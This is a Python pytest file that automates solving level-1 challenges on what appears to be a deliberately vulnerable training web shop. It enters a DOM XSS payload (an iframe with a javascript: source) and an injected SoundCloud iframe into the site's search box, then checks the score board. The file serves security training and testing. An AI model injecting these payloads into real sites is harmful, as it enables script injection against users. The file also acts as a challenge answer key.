from pytest import mark

from src.pom.navigation import NavigationPage
from src.pom.score_board import ScoreBoardPage


@mark.level_1
class TestLevel1:
    @staticmethod
    async def test_score_board(score_board: ScoreBoardPage) -> None:
        await score_board.navigate_to_score_board()
        # await score_board.select_star_level(1)
        await score_board.validate_completed_task("Score Board")

    @staticmethod
    async def test_dom_xss(navigation: NavigationPage, score_board: ScoreBoardPage) -> None:
        await navigation.search('<iframe src="javascript:alert(`xss`)">.')
        await score_board.navigate_to_score_board()
        await score_board.validate_completed_task("DOM XSS")

    @staticmethod
    async def test_bonus_payload(navigation: NavigationPage, score_board: ScoreBoardPage) -> None:
        bonus_payload = """
        <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
        """
        await navigation.search(bonus_payload)
        await score_board.navigate_to_score_board()
        await score_board.validate_completed_task("Bonus Payload")
